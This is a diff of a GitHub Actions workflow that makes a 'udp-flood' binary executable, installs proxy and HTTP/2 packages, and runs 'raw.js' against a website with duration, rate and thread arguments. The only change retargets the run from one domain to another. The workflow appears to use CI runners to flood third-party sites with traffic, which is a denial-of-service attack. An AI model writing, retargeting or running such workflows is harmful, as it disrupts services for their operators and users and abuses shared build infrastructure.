@@ -11,4 +11,4 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x udp-flood
-      - run: npm i chalk@2.3 && npm i hpack && npm i socks && node raw.js GET https://www.airbridge.io/ 1200 5 90 --debug --full
+      - run: npm i chalk@2.3 && npm i hpack && npm i socks && node raw.js GET https://load.vmheaven.io/ 1200 5 90 --debug --full
